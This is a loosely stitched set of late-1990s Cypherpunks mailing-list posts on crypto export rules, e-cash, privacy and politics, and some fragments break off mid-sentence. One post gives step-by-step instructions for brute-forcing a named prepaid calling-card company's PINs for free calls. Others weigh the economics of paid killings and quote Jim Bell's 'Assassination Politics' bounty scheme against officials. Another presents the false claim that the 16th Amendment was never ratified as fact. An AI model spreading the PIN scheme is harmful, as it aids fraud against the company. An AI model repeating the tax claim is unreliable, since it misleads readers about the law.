nations come into conflict. My prediction is that it will be the moral values of the most intolerant nation with the largest weapons.

What most of us think is very weird is Rotenburg's apparent inability
to carry on a coherent dialogue.  Tim May raised several solid and
specific points.  We've got back ad hominem attacks on "libertarians".
Instead of name calling, Rotenburg would have done well to simply
justify (or change) his position.
At this point, Mr. Rotenburg and his supporters should explain exactly
what it is they do for us and how we can verify it.  "We arrived at a
compromise with the Senate" is not persuasive to most of the people on
this list.  When you believe that privacy will be promoted by hiring
more bureacrats the level of trust warranted is not high.  So, if EPIC
is doing any good, it had better be the kind of good we can monitor.
As for the ACLU, they are notoriously inconsistent when it comes to
the Constitution.  They seem to be pretty good with the First
Amendment, but that's about it.  They undermine the Second Amendment.
They campaign for welfare on the basis that it is a prerequisite for
the exercise of civil rights.  They sue aspirin manufacturers for
labelling their products in English.  They push "fair" credit laws.
Etc. Etc.
We don't need friends like the ACLU or, it appears, EPIC.

Denning thinks export of authentication and signature technology is OK,
but she draws the line at encryption.  This sounds fine, but what happens
when new technologies don't fit into these neat boxes?
How about blind signatures?  Those are used to create anonymous electronic
cash systems.  How comfortable will Denning be when criminals can set up
their own anonymous payment systems?
Would blind signature technology be allowed for export today?
How about zero knowledge protocols?  These can be used to show different
kinds of anonymous credentials and can be used to build anonymous cash
systems in their own right.  Generally, they enhance privacy by allowing
the parties to reveal only the information which is specifically necessary
for a transaction.
Would zero knowledge software be allowed for export today?
How about multiparty computations, or oblivious transfer, or blob
commitments, or any of the other building blocks of tomorrow's crypto
technology?  What is the export status of these going to be?  Will Congress
have experts who put each piece under a microscope and try to judge
whether it will be used for good purposes or bad?  It can't be done.  As
well allow exporting the letter "a" but not "i" since "i" is part of "kill".
This attempt to split cryptology into good and bad technologies won't work.
Knowledge space doesn't work that way.  It's probably not even going to be
possible to identify what is crypto and what isn't.  It's all a matter of dealing
with information in various ways.
Cypherpunks can expose this confusion by implementing other protocols and
trying to get them exported.  Go beyond old-fashioned signatures and
encryption.  These are mainstream today.  Stay on the edge, be ahead of the
curve.  Do something new.

@_subject: ethanol, which is a fuel made from a mixture of corn and your tax dollars 
June 6, 1997
Potomac Watch
Guess Who's Trying To Save Corporate Welfare
By PAUL A. GIGOT
Let us now break this column's recent pattern and praise a Republican.
He's Texan Bill Archer, who is taking a run at the federal government's
worst case of corporate welfare. He has just one problem: Other
Republicans, notably the speaker of the House.
Mr. Archer wouldn't have sat in the minority for 24 years if he wasn't
willing to tilt at windmills. But now that he's running the tax-writing
Ways and Means Committee, his tilting matters. So this year he's aiming
at ethanol, which is a fuel made from a mixture of corn and your tax
dollars. He has enough votes to get the bill through his committee, and
it could pass Congress if the GOP leadership gave it a push.
The entire corporate welfare debate is a good test of whether the GOP's
ultimate loyalties lie with business, or with taxpayers. The ethanol
savings would be only a couple of billion dollars, but in today's
Washington we have to be grateful for small favors. By shutting down
this corn sluice, Republicans would show they can ox their own political
gore. They'd also create more space for tax cuts that'd help more
Americans, such as for capital gains.
The political timing won't get any better. When Mr. Archer first tried
this in late 1995, Bob Dole, self-described Senator Ethanol, hadn't yet
retired. The presidential caucuses in Iowa, ethanol's Elysian fields,
were three months away, not three years as they are now.
Archer-Daniels-Midland Co., the political benefactor and ethanol
beneficiary, hadn't yet pleaded guilty to price-fixing charges.
Farm-state Republicans had more leverage over their leadership in 1995
because the GOP was trying to pass a budget with only GOP votes. Now in
bipartisan mode, Republican leaders can pick up some Democrats to keep a
All of which puts the pressure squarely on Newt Gingrich, who has to
decide if he again wants to rescue the ethanol subsidy at the House
Rules Committee pass. That's what he did in 1995 after consulting
Senator Ethanol. The speaker explained to some of us then that killing
the subsidy was too politically risky while Republicans were trying to
change so much of the rest of the government.
But Republicans are now trying to change very little of the government,
and Mr. Gingrich is still resisting. "I do not believe it is possible in
this Congress to eliminate the ethanol tax break," the speaker told
reporters this week. That's analysis masking incumbent protection. The
speaker is fronting for members who don't want to cast any difficult
votes this Congress.
Those members include several ferocious Republican opponents of the
welfare state, nonfarm version: Nebraska's Jon Christensen, erstwhile
revolutionary; John Boehner, from the farm state of greater Cincinnati;
Henry Hyde of the poverty-stricken Chicago suburbs; Michigan's Fred
Upton, the renowned budget balancer; and Helen Chenoweth, Idaho's
scourge of Big Government.
Perhaps they were inspired to sign a letter embracing ethanol subsidies
by another co-signer, the greatest class warrior in all of Congress,
Michigan Democrat and man of the people, David Bonior. He's now earned
the title of Congressman Ethanol.
This crowd must have missed a recent General Accounting Office report,
which found that the ethanol subsidy justifies none of its political
boasts. It doesn't help air quality much, hardly reduces U.S. dependence
on foreign oil and shovels much of its benefit to big ethanol producers.
"Sixty-five percent of capacity is owned by the three largest firms, and
the largest firm, Archer-Daniels-Midland, owns 50% of capacity," says
the GAO study. Some things dubbed "corporate welfare" are arguably
useful, but this isn't one of them.
What's most notable, and depressing, about all of this is that it
symbolizes the GOP Congress's change from reformers to incumbents. A
majority Democratic coalition is naturally held together by its power to
dispense government favors. But Republicans won their majority in 1994
running on ideas and reform.
The danger for Republicans is that they are slowly evolving into a
majority whose main rationale is keeping power. "That's what I fear more
than anything," says Indiana Rep. David McIntosh, who voted against the
budget deal for that reason. This may let Republicans keep their
majority in 1998, but it hardly offers much reason to increase it, or
much of an agenda. And sooner or later even House Democrats will figure
out they can win back the House if they depict Republicans as the party
of status quo government.
All politicians claim to hate corporate welfare, but they vote for it
when only the beneficiaries are watching. They could learn from T.J.
Rodgers, the Silicon Valley entrepreneur, who has rounded up 61 fellow
high-tech CEOs to say they support cutting corporate subsidies, even if
it means giving up their own federal grants. Republicans are supposed to
believe this too, as Bill Archer, to his credit, is reminding them.

Please help me by mass emailing this out to the Internet.  I am sure
we could find �others� who would like a REFUND too! (g) LOL!
I just discovered a "way cool" crack for IQ DIRECT / WMRG COM., a pre-paid calling card company.  If you want FREE long distance to any where in the world here it is.!!!
Call 1-800-510-7941 the automated prompt will ask you for a pin number.
Now here is the "Way Cool" Crack ...The pin number is a 10 digit code, for example: 748-700-4162  The first 3 numbers is the 'batch" code and will always stay the same.
The "batch" codes seem to run sequentially. In other words 100, 101,112 ...748,749,....999 end.  The "batch" codes also represents dollars denominations of $5, $10, $20, $50, $100, $500!!! (lol G)
The second and third set of numbers are somewhat random.  However as in the example 748-700-4163, I know of people who have been able to pick up a lot of FREE time just by changing one number in the second or third set of numbers. When you dial the 1-800-510-7941 number the automated voice will allow you 5 attempts to enter the correct pin number.  You will be disconnected after the 5th attempt.  But hey, no problem!  Just call back and retry.  I have found on average that within the 10th attempt at entering a pin number, you will find an authorized pin number!
It is really a lot of fun!  Sort of like spinning the Wheel of Fortune and coming up with a jackpot of up to $500 in pre-paid long distance!
This crack is likely to end within 1 week of this posting 6/07/97. Do yourself a favor and Hurry!  Let everyone know about this "limited" opportunity. (G)
Due to high call traffic you may run into busy signals  (lol & G)!!!

Moral issues aside, one of the problems plaguing

Not likely, but for another reason.  Assuming you had the money to take
out your neighbor, it's going to be fairly obvious who did it.  (How many
neighbors do you have?  Pretty short list of suspects.)
Also, killing some nobody in a grocery store is more prone to error, and
less widely witnessed, and therefore harder to collect payment on, thus
less profitable.
The possibility of Microsoft killing their competition's engineers is
somewhat more realistic, although lately they've been hiring a lot of
them instead, so maybe they don't want to kill them. :)

Then I download the recipient list. (another 40,000 bytes)
I find a message for me.  Let's suppose the messages are 20K each.
I send each server a list of the messages I want (10,000 bits, which is
1,250 bytes each, so 6,250 bytes total)
Finally, I get back five 20K messages from each of the five servers.
So that's a total of 80K to download the IDs/recipients lists, 6.25K to
upload the requests, and 100K to download the message pieces, to read my
20K email.  I guess that could work.

_The Atlanta Journal-Constitution_
"Contest Controversy: Radio Promotion Is Called Tasteless"
Miriam Longino, Staff Writer
Atlanta radio station 96rock is making waves with a contest that asks listeners to predict the year, month, day and time when convicted Oklahoma City bomber Timothy McVeigh will be executed. The winner gets a free trip to cover the event.
Rock Station WKLS-FM (96.1)--calling itself "The Home of Capital Punishment"--is running a 45-second spot 12 times a day to pitch the contest.
...96rock promotions director, Pat Ervin, ...says he feels the station is "playing on the sentiment of the majority of the public." "We saw an opportunity," he says. "It's obvious that people are very passionate about this thing. So we decided to use a creative mechanism to tap into that."

This is in reference to a local, that's being held incommunicado
in Tacoma. I've personally tried to contact Jim and the Marshalls office said they'd "try" to get a message to him, wouldn't give me an address, and were REALLY interested in my address.
 I believe the reason for holding Jim incomunicado is that the ACLU
requires that the accused ask them for help, and the feds know that
if Jim can't ask he won't get their help.
Vin covers the situation nicely...
[Vin Suprynowicz column:]
    In the summer of 1995, 39-year-old electronics engineer Jim Bell of
Vancouver, Wash. (coincidentally the scene of the climactic battle between militia and central government forces in Ian Slater's current potboiler paperback "Showdown: U.S.A. vs. Militia,") penned an intriguing and controversial essay called "Assassination Politics," which has since been kicking around various Internet discussion groups, triggering responses from delight to outrage.
  This section from Mr. Bell's introduction gives the gist:
  "A few months ago, I had a truly and quite literally 'revolutionary'
idea, and I jokingly called it 'Assassination Politics': I speculated on
the question of whether an organization could be set up to legally announce that it would be awarding a cash prize to somebody who correctly
'predicted' the death of one of a list of violators of rights, usually
either government employees, officeholders, or appointees. It could ask for anonymous contributions from the public, and individuals would be able send those contributions using digital cash.
  "I also speculated that using modern methods of public-key encryption and anonymous 'digital cash,' it would be possible to make such awards in such a way so that nobody knows who is getting awarded the money, only that the award is being given. Even the organization itself would have no
information that could help the authorities find the person responsible for the prediction, let alone the one who caused the death. ...
  "Obviously, the problem with the general case is that the victim may be
totally innocent under libertarian principles, which would make the killing a crime, leading to the question of whether the person offering the money was himself guilty.
  "(But) my speculation assumed that the 'victim' is a government employee, presumably one who is not merely taking a paycheck of stolen tax dollars, but also is guilty of extra violations of rights beyond this. (Government agents responsible for the Ruby Ridge incident and Waco come to mind.) In receiving such money and in his various acts, he violates the
'Non-aggression Principle' (NAP) and thus, presumably, any acts against him are not the initiation of force under libertarian principles.
  "The organization set up to manage such a system could, presumably, make up a list of people who had seriously violated the NAP, but who would not see justice in our courts due to the fact that their actions were done at the behest of the government. ..."
  In a followup essay titled "Fishing Expedition Swims Against the Tide,"
published in the May 14 edition of the daily Portland Oregonian, Bell
wrote, in part:
  "... I've been openly debating the idea on the Internet since then with
anyone who will listen. My essay surprises many and shocks more than a
few, but I am pleased that such a truly revolutionary concept has been so
well received. Even the Columbian newspaper ( has decided to add a pointer to the essay.
  "The only 'threat' in the essay is to the jobs of the people who have
been parasites on the rest of us for decades, as well as to the future of
tyrannies around the world.  But that's why, on April 1, 20 federal agents burst in and took my computer, told the news media I was 'armed and
dangerous,' and began engaging in a fishing expedition including harassing people simply for knowing me. (No arrest or charges so far.) ..."
  The charges were forthcoming.
  Jim Bell was arrested on Friday, May 16, and has been held ever since,
without bond, in the Pierce County Jail in Tacoma, Wash., on a federal
complaint which alleges:
  "Beginning at a time unknown, and continuing to the present, ... JAMES
DALTON BELL did corruptly obstruct and impede ... the due administration of the internal revenue laws, among other things, by collecting the names and home addresses of agents and employees of the Internal Revenue Service
('IRS') in order to intimidate them in the performance of their official
functions; by soliciting others to join in a scheme known as 'Assassination
Politics' whereby those who killed IRS employees would be rewarded; by
using social security account numbers that were not assigned to him to hide his assets and thereby impede the IRS's ability to collect his unpaid
taxes, and by contaminating the area outside of the office of the IRS in
Vancouver, Washington, with mercaptan, a chemical that causes a powerful
  Nor does the complaint stop short with an alleged "stink bomb" floor mat, proceeding to allege that Mr. Bell has at times discussed poisoning water supplies, sabotaging government computers, and, well ... "overthrowing the Government of the United States."
  The question here would appear to be whether Mr. Bell has actually taken substantive steps, as alleged, to "implement" the theory in his speculative Internet essay, or whether it is the IRS -- who since Feb. 20 have seized the heretofore non-violent Mr. Bell's car, wages and bank accounts (presumably stymying at the very last minute his plan to "overthrow the Government of the United States") -- who are doing the "threatening and intimidating," in an attempt to send a message to anyone who dares speculate about how justice might ever be obtained against federal agents ... given that they are rarely if ever indicted, even for the willful murder of children, as at Waco and Ruby Ridge.
  If the defendant Bell has indeed taken substantive steps to set in motion the murder of any specific government agent, that of course is a crime, for which he should expect to face the consequences.
  On the other hand, if writings of the "what if someone ..." variety have now become a felony so serious that one can be seized and held without bond, most of America's adventure and science fiction writers -- who up till now have felt safe spinning thinly-veiled yarns about near-future government coups and such -- had better watch their   Mr. Bell's attorney, Peter Avenia of the Public Defenders Office in
Tacoma, says he fully expects Mr. Bell to be indicted by a federal grand
jury within the next few weeks.
  I asked Mr. Avenia if he believes the case will present substantive First Amendment questions.
  "It certainly does concern me."
  Is the IRS making an example of Mr. Bell, to chill any further
discussions on the Internet of how justice can ever be had in the case of
uniformed killers who apparently need no longer fear being indicted or
brought to trial in this country?
  "It's certainly a possibility. In the context of the Oklahoma City
bombing it's certainly a hostile atmosphere for any such defendant. I think we can certainly ask whether the government is trying to send a message to people who pen inflammatory writings."
  Defense attorney Avenia can be reached at the Federal Public Defenders
Office, 1551 Broadway, Suite 501, Tacoma, Wash. 98402. The essay
"Assassination Politics" is available on the Internet at

From: Peter.Foldiak at st-andrews.ac.uk (Peter Foldiak)
  Newsgroups: sci.crypt
Digicash says:
"... ecash is not at all well suited for black markets, extortion,
bribes and tax evasion. The reason is that only the payer is anonymous,
the recipient of the money has no anonymity at all.
Furthermore, all money that the payee receives must be given to the
bank. It is not possible to hide from the bank the fact that you
received money (and thereby hide it from the authorities). So
tax-evasion is definitely out. For people who operate black markets
the same story holds. First of all, their income is visible. The second
reason is far better: if any of the customers ever wants to,
he can prove that a certain payment was made by him. This means that
a criminal accepting ecash
can be identified with the retroactive help one of his customers. ..."
Is this really true under all circumstances? Can (some kind of) e-cash
be made truly two-way anonymous, like physical cash?

It should go without saying that the above is nonsense.  Sorry Tim.  To
take only the least obvious point:  the Constitution states in Amendment
21 -- ratified in 1933 and beyond any argument part of our Constitution --
that states get to make all the rules about the transportation or
importation of liquor into their jurisdiction.  You may not like this
rule, but it is beyond any serious argument our law.  A state that uses
this power in a stupid way is not acting in any sense
"unconstitutionally".  Supporters of this bill can be called "dumb" or
"bought and paid for" or other unkind things.  But I fail to see how

Re: Nym Servers
Igor and D.V. have been discussing the viability of
cyberpromo as a host site for remailers; Igor points out
that many recipients will auto-trash anything from there.
On the other hand, it's a good entry point for a middleman remailer
or a nym remailer, as long as you can trash anything from there
without also trashing your remailer's mail :-)
In particular, your remailer was going to remove direct references
to cyberpromo anyway.
However, the prices have changed since I brought up the idea
a month ago.  At the time, they had auto-responders with POP mail -
- - $50/2yrs POP+autoresponder, or $39 one-time for a mail forwarder.
Now, however, they offer autoresponders for 3/$99 for three years,
with no mention of POP mail or forwarding - I don't know if they've
dropped the service (in favor of web hosting at $25/month),
or if it's still there and just not advertised.  (Of course,
there's still the moral dilemma that even $99 is $99 in Spamford's pocket :-)

They can always harrass.  Supposedly the State Department reports to the
IRS anyone who does not give this info, but the IRS seems not to follow
up, an the only thing they could do under the law is impose the $500
penalty which would probably not survive a court challenge (I forget the
particular reasoning, but if they challenged and lost, no one would have
any fear not giving their SSNs out, similarly to why they don't charge
every cypherpunk under export laws - fear of grey is more useful than a
clear line that will be more liberal than they want).  When I applied for
a passport (specifically because it is a government recognized ID that
need not contain your social security number), I didn't write the IRS at
all (you have no duty to notify them), and IF contacted, I would simply
say "Who do I make the $500 check out to, and where do I send it, and who
should my lawyer contact to challenge it".  I have never been contacted. IANAL, but: There is another statute which says that any time a government
agency (it does not apply to corporations) asks for your SS# they have to
state the reason and authority they have to ask for it (something like a
state statute or order - I will look up the info and post here when I have
time).  Usually the behind-the-counter culture doesn't know about this. You can also give a religous objection. You can ask for the name of the
person and their exact title then ask nicely to speak with a manager
familar with the law or procedure, and that it might be illegal to ask for
that information without citing the authority (with the above law in
hand), etc.  Since they have to have alternate ID numbers unless they only
give licenses out to US citizens and not the Amish or others who have
religous objections - you can ask for one of these alternate numbers. You
can also be agreeable and say, OK, if you want to see my SSN so that you
can confirm that I am me, I will show it to you, but I don't want that
specific number on my license, and you can pick any number that is
convienient to you, or I can supply my standard "alternate-ID" number.
My state uses a number that is a wierd checksum of my name and birthdate
and who knows what, so it doesn't apply to my drivers license.
I had my SSN used (they didn't tell me that is what it was for, and this
was before I was as aware of the privacy matters) on a professional
license, and they did things like disclose it to people who bought their
mailing list and it appeared in some mailings.  I only had to call the
state office, explain about the problems of identity fraud, and had a new
license with a new number (which I use as my alt-id number)  within a week
(and they said they would not include SSNs with their mailing list).  Some
people are reasonable.
Generally they try to find the easiest path.  When it is clear that you
won't go away quietly, and that you are going to be more hassle than it is
worth (and that you aren't trying to evade any requirement, e.g. "You
agree that I have proper ID, and qualify in every other way, and the only
reason you won't is because I won't tell you my SSN even though you can't
cite the authority you have ...") you can usually get them to either
relent or say something slanderous in public.  A silly but necessary game.
Now if I can mail in a form, I usually use the alt-id number and write it
in place of the SSN with a note right next to it saying it is not my SSN
and that if you really want it you have to write me back and explain why
they want it.  (If they do, I send them a NDA with something to the effect
that if I find it has leaked anywhere they have to cover all costs
associated with correcting any record, etc.).  Given that they are usually
desparate to sign me up for whatever it is, and the mail is a hassle for
them, they just enter the alt-id number.  I keep a copy of the original
form with the Not-my-SSN statement in case someone wants to accuse me of
any kind of fraud.

@_subject: SSN - when can agencies ask, and passports 
The privacy act of 1974 (public law 93-579) says that any government
agency has to provide you with the follwing when asking for a SSN:
1. If the disclosure is mandatory or optional
2. The statutory or other authority they have to ask for it
3. How it will be used
4. Any penalties for not disclosing it.
These should be in a "privacy act notice" the agency should already have.
As far as passports, I have a pointer to an article in the Western State
Law Review, Fall '92 issue by Stephen Kruger.  The title is Passports,
Social Security Numbers, & 26 USC sec 6039E where he points out that it is
probably unconstitutional to fine someone.
A plug is warranted since the above info (and a lot more of value) is in
Financial Privacy Report, Vol4N8 (August 1994) - I think back issues are
$15, but call first (612)-895-8757.  This issue is entitled 22 ways to
protect your social security number from thieves, snoops, and bureaucrats.

@_subject: Technology 'secures' gunfire [CNN] 
Jonathan has hit on a point which illustrates the danger of the
surveillance technologies that are _already_ in place, vis a vis,
the Internet.
  Something lost in the euphoria over the citizen's radical new ability to access information: Yahoo Search--"Posts by _me_."
is that the same technolgy, and more, is at the fingertips of
the proverbial 4 Horsemen AND (now for the _really_ bad news)
at the fingertips of "John Law, the Citizen's Friend."
  Sadly, "garbage in--garbage out" _has_ always, and _will_ always,
result(ed) in such inanities as Drug Counselors being 'rated' at
the same level as Drug Dealers when the computer spits out the
results of a badly structured "search for the _bad_guys_."
  Naturally, when the police mistakenly kick in the door of a Drug Counselor, it is always a 'regretable tragedy' when they
shoot holes in the ten year old boy in the hallway who is holding
an over-ripe banana which 'looked like a weapon.' (Almost a true
life example, told to me by a friend who left her career in law
enforcement because she was still in possession of a conscience which was capable of recognizing that children killed by those who are 'just following orders' are just as dead as the children
killed by those who are 'out of control.')
{The person in question 'pulled' her shot at the last moment, upon
 realizing she was about to murder a child with a banana. Because
 the banana "could have been a weapon," an investigation was not
 required for an officer firing upon an unarmed citizen.
 I regard this lady as a wonderful example of someone who has held
 themself to a higher standard than their government regulators and
 their peers. What is a shame is that someone who _should_ be the
 type of person charged with protecting us had to leave the system
 because there is no future for those who choose sanity, logic and
 humanity over 'following orders.'}
  If you stop to consider Jonathan's examples of (paraphrased),
"give me the names of every citizen in location 'A' at time 'B'
who has used the word 'normal' in an email in the last ten years,
etc., etc." in light of Internet search engine capabilities being
extended to such technologies as 'citizen physical location monitoring', 'voice recognition', 'DNA pattern analysis' (e.g. heriditary potential for violence, etc.), then the future may be very scary, indeed.
Think about this:
"Ladies and gentleman of the jury, the person who is reading this
post is the 'only' individual, out of over 20 million processed by
the Never Wrong Criminal Identification Compter System, who is in
the post reader's general location, today, has completed their
high school education and has a family member who has committed
murder in the last five generations."
(What? You claim you are not the _only_ person in New York City,
 with a high school education. Nice try, pal, but the computer is
 never wrong.)
"Although no murder has been committed yet, statistics show that
someone in that area will be, within the next two days, so I ask
that you return a verdict of 'Guilty of murder in the first degree'
and we will pick up and execute the reader of this post as soon
as a body turns up."
...in light of _this_:
A citizen was found guilty of murder by a jury, based on the slim
eyewitness testimony of a passerby who caught a fleeting glimpse
of the murderer, despite testimony from over a dozen people that
the defendant was, at the time of the murder, attending a wedding
thousands of miles away.
Some of those giving testimony did not even know the man prior to
meeting him at the wedding, and were in no way related to the man,
but the jury was still swayed by the prosecutor's claim that this
wide variety of law-abiding, average citizens were lying to try
and protect the defendant.
Do you have a great-great-grandfather who committed murder? Then you are, by heridity, a potential murderer. It's in your blood!
This is '10 points against' you. All of the kindness you have don
in your life does not count in your favor, because any fool can
see that it was done in an attempt to trick the jury.
  Of course, Jonathan is a raving lunatic for suggesting these
possibilities, much like the mentally unstable people who history
as believing that one day people would be able to send electromagnetic
waves through the atmosphere and have their images and voices appear on
machines in distant places.
  Seriously, history has shown that any technology capable of being used
for great evil _will_ be used for great evil.
  The reason that technology radically increases the ante in the game between good and evil is that if one 'evil' person is in control of
technology that ten million 'good' people do not have access to, then
the basic humanity or inhumanity of humankind, in general, is really
not an important part of the equation which will determine the future.
  (I challenge all other cypherpunks to a fistfight, the only rule being that I can use an Uzi, and you can't.)
  Remember...when all is said and done, my dad was an optomist.

After seeing the intents of PGP Inc. with the
release of their new PGP that breaks the old
free versions, I have all but written them off as anything but the Enemy, and am waiting for
a public reply on the list by Tim May to make
it official.
But now what? Please someone answer my questions
about PGP - it appears that the 5.x versions are not
compatible with the 2.x versions which came previous.
Is this so? Also, the direction they seem to be
heading is in providing more and more non-free
GAKked product. But aren't the 2.x and 5.x versions
freeware? If so, can't others - a group of individuals - take that source code and build off
of that? Piss on these assholes and their licensing
fees. It was inevitable, anyway. They are a corporation after all, and the corporations are not on "our" sides.
I can see a scenario where government is impotent
and destroyed within 10 years. What will remain
and will be harder to eradicate are the corporations.
I don't think we should rely on corporate software
whenever possible, because it always comes with
an ulterior motive. Is there an effort to maintain
a version of PGP based on the free 2.x sources
that is not affiliateed with the fuckwads at PGP Inc.? If not, is it high time some of us began such an effort?

Fortunately some of these "good" lawyers already exist at the Institute for Justice.  Basically, they are a libertarian version of the ACLU.  They've accomplished some good things and deserve the support (read $$$) of freedom-minded individuals everywhere.  (note: I'm not connected with them

in sync with our views)
 "If you seek a courtroom champion for individual liberty, free market
  solutions, and limited government, look only as far as the Institute
  for Justice.  When politicians pass sweepingly intrusive laws and
  bureaucrats build their empires of paperwork and power, only the
  Institute for Justice brings them to account in court."
  -- Bill Benson has done some extensive research (his book is called The Law That Never Was) regarding the 16th Amendment (the so-called Income Tax Amendment) and how it was ratified.  According to the information he has uncovered through exhaustive research in D.C. and all of the state capitals of the then 48 states, the 16th Amendment was never ratified by 3/4ths of the states. (see  for more info)
Friends of mine have spoken to Mr. Benson about this, and he says that the courts won't touch it with a ten foot pole.  He even sells a package (or at least he was selling it back in 1995) of legal information about the non-ratification of the 16th that can be used as a defense in an income tax case.  According to Mr. Benson (in 1995), each of the cases was dropped when the defense made it clear they were going to argue their defense based on this point.
I understand that folks in the "patriot" movement have tried to take this to the Supreme Court without success.  The Court refused to hear it.
Assuming Mr. Benson's research is accurate and legitimate, the 16th didn't even come close to being ratified and is truly a Law That Never Was.  Think about that next April 15th...the IRS's "lawful" authority is based upon a
legal fiction.  That's why it's called >voluntary< compliance.

Best way to mobilize a society: give them a Devil to hate. It's much easier
to get people to hate than to love. Blame the Press, the Permissive Society,
the Liberals, the Educational System. Of course, once you get rid of the
Devil, it's usually a good idea to have the slave's collars on everyone
BEFORE they realize the problem's still around.
You need a song to cheer you up. Try this one:
"There's a place in the world for the angry young man
With his working-class ties and his radical plans,
He refuses to bend, he refuses to fall,
And he's always at home with his back to the wall.
He's proud of the scars and the battles he's lost
And he struggles and bleeds as he hangs on the cross,
And he likes to be known as the angry young man."
                    --Billy Joel, "Angry Young Man"
You clearly need a better country to live in. I suggest China; they have a
long history of keeping impure materials out of the hands of the easily

Syria, or Lebanon would be more to your liking. If you're interested in a
proven weight-loss program, maybe North Korea is your best bet. Done already, by the gub'mint. Kids can't read or write at all nowadays,
despite the high level of per-pupil spending.
Done already, by the FCC and the religious right.
Done already, by the actions of mudsucker politicians who seek re-election
at any cost, even the freedoms guaranteed by the Constitution. "I think
I'll vote Demopublican this year, or maybe Republicrat. I have such a
hard time telling their extremist positions apart."
I could claim this was the reason Usenet was created, but I'm not a

The religious right again.
See if you can guess who said this and when:
"A democracy cannot exist as a permanent form of government. It can only
exist until a majority of voters discover that they can vote themselves
largess out of the public treasury."
Was it:
a) Alexander Tytler, 18th century;
b) Thomas Jefferson, early 1800s;
c) Karl Marx, late 1800s;
d) V. I. Lenin, 1915
Here's a hint: Pick the Scottish historian who lived in the 1700s. So the
concept of a "bankrupt democracy" has been around for a while.
Create a climate of fear. Spread uncertainty and doubt among the populace.
Wave the battle flags of pedophilia and terrorism proudly from the ramparts,

Nortel is nothing more than a Canadian schill for the SnoopSpooks.
Just as the INSLAW Thieves & Murderers used Indian Reservations in an

It is no coincidence that Nortel is the nesting place of a wide

An analysis of a number of employees of Nortel and their bum

These are the same lame fuckers who pulled off this act
in Switzerland, with governments and corporations buying
security products from a country noted for its neutrality,
and then finding out later that it was a front for a

It amazes me that corporations and governments put their trust

I feel that Tim is correct, in terms of "opinions," but the Christian
political agenda goes beyond 'opinions' and into the realm of political

  It is a fact that the Moral Majority/Christian Right/Felons For Jesus,
etc., make no bones about using their tax-deductible resources to mount
political campaigns that illegally skirt the rules pertaining to the
direct support of political parties and candidates.
  If the Commie Chincs brunching at the Whithouse and sleeping in the

Huh? Since when has school prayer had anything to do with religion?
Its about indoctrination. If you force someone to say something day
after day, or even hear it day afterday, after a while it stops
representing a idea, and starts representing a truth. The pledge of
allegiance is a prime example. Ask a school age kid "does america have liberty and justice for all?"
and they will quote back without thinking the pledge of allegiance "I pledge allegiance to the flag of the united states of america
and to the republic for which it stands, one nation under god
indivisible with liberty and justice for all"
Long after they stop forcing you to say it you still remember it. You still believe that america is "a nation under god" and has "liberty and
justice for all" whether or not there is any evidence at all to support it. That is the beauty of it, there need be no evidence of liberty at all just like there is no evidence that terrorists and kiddie porn
collectors are running rampant on the internet. Just like there is no
evidence that the economy is worse than it has ever been. Just like there is no evidence that 2/3s of the crime in america is committed by
teenagers.Just like there is no evidence that you have a 50% chance of
being killed when you leave your house. People hear these "facts" day after day on tv but are never offered any proof but im sure if you ask most
people "how is the economy" they will say "worse than it has ever been".

So, perhaps the modern-western idea of separation of Church and State
is based on an unreasonable optimism that such a thing is possible.
Perhaps it's actually more honest to admit that the state will always
reflect the religious framework of the rulers, as (I believe) Muslim
countries tend to do.
Of course, there's no reason to believe that honesty actually
determines social structures, and so one might say that it's just more
useful to _claim_ that church and state are separated.

The problem, as I see it, is that the laws regarding political
and resulting political activity are different from the laws regarding
church donations, thus leading to the Christian Right using the
to bypassing the restrictions that are placed on organizations
as political groups.
  If 'Joe's Whorehouse and Illegal Drug Emporium' were to engage in the
same types of political activities that the 'We Wear Halos Church' did,
they would be subject to arrest and imprisonment for a wide variety of
violations of electoral law.
Vote-Reality is that most politicians would no sooner oppose a totally
unconstitutional law that promises to 'save the life of a single child',
than they would promote the prosecution of the 'good guys' for doing 'bad things'.
Churches hold the same favored 'good guy' status as policemen who violate the civil rights of 'bad' citizens.
  Churches, like governments, corporations, or any other organized entity, have some wonderful people in them, doing wonderful things.
The problem, as always, is what our founding fathers realized--these
types of organizations/structures tend to grow and attain power which
is then used for the purpose of self-sustained growth (survival).
  Humanity tends to evolve, while organized humanity tends to de-volve.
Biped humans, walking upright, form organizations which move toward
becoming quadrapeds dragging large clubs.
Most of the issues/problems discussed on the Cypherpunks list are often
dealt with in terms of a combination of 'the way things are' vs. 'the
way things should be' vs. 'the way things are becoming'.
My view is that things have become so askew that any one of the above,
or any of them in combination, are not adequate for dealing with what
is to come in the near future.
The statement of one of the founding fathers, in regard to needing a
revolution every twenty years, or so, should be considered in the light
of the history of 'forest fires.'
Forest fires know that there should be a 'revolution every twenty years'
but humans do not. In our foolish wisdom, we decide to intervene in the natural course of things, to 'make things better'. We then proceed
to put the natural balance so far out of askew that, once we have 'saved' the forests by not allowing forest kindling to burn for a
hundred years, the Forest Stock Market undergoes a major 'correction'.
The structure of American government, electoral laws, charitable tax
deductions, etc., are not inherently evil in themselves. The problem
is that they have all been subject to interference with the basic
underlying concepts, in efforts to improve them with a 'more is
better' mentality, that they are all ripe for burning.
["Welfare (charity) has resulted in many positive benefits. Hey!  I have a good idea! Let's put _everyone_ on welfare!]
The structure of government/laws/society is very similar to that
of the Internet, with everything being linked in ways that become increasingly complex once individual entities decide that
things need to be done a 'certain way' in their own self-interest,
instead of in the needs of the underlying infrastructure.
The problems multiply as the number of entities deciding which
'certain' way is the 'right' way becomes smaller.
"Spam is bad. _I_ am going to _save_ everyone from spam. Flames aren't so good, either. I'd better save you from 'flames' as
well. What constitutes a flame? Well, it all begins with
disagreement and, since I decide what is and is not a flame,
I guess that a flame could be defined as disagreement with
("In order to save the list from spam, we had to destroy the list.")
Now that we are all aware of the disruptive manipulations of the
Evil Dr. Vulis, perhaps he has changed his online persona to that
of 'Jodi Hoffman'. (:>}

@_subject: Springer/Gates Merger 
CANADIAN NUTLY NEWS:
[CNN, Bienfait, Saskatchewan] BAR OWNERS at the Coaldust Saloon, in violation of Canadian bartender/customer confidentiality laws, revealed details of a planned merger between Micro$oft and the
Jerry Springer Show.
Computer magnate Bill Gates has signed a secret deal with Jerry
Springer to host a variety of WebTV productions which will be
InterActive variations on the 'Terminal Man' theme.
Springer, upset over the news media outcry over his proposed move
toward bringing his Barnum & Baily act into the mainstream news
forum, plans to take his revenge by using Micro$oft's domination
in the lowest-common-denominator market to parlay his lack of
good taste and journalistic ethics into a full-scale assasult on
the elitest mainstream news media which continues to ignore the
real desires of the general public.
